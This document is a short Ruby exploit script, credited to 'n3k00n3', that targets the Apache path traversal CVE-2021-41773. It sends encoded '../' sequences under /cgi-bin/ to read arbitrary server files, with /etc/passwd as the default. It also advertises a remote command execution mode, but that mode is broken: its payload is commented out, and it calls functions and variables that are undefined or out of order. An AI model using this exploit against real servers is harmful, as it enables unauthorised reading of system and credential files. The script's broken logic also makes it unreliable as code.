#!/usr/bin/ruby
# Author: n3k00n3

require 'uri'
require 'net/http'

url = ARGV[0]
file = ARGV[1]
command = ARGV[2]

path = "#{url}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/#{file}"

def usage
  puts """
  usage:
    Simple Scan: ./CVE-2021-41773.rb <url>
    RCE: CVE-2021-41773.rb <file> <remote command exec>

    example: CVE-2021-41773.rb bla.com /bin/bash whoami
  """ 
end

if ARGV[0].nil?
  usage()
	exit 0
end

if !command.nil?
  rce_request(path, command) 
end

file = 'etc/passwd' if file.nil?

def make_request(path, command)
  uri = URI.parse("#{path}")
  
  # RCE
  #if command
  #  return Net::HTTP.post_form(uri, 'echo Content-Type: text/plain; echo; id')
  #end

  res = Net::HTTP.get_response(uri)
end 

def scanner(path)
  res = make_request(path, command = false)

  if !res.is_a?(Net::HTTPSuccess)
    puts "Sorry, Not Vulnarable!"
    exit 0
  end
  puts res.body
end

def rce_request(path, command)
  res = make_request(url, command)
end

scanner(path)
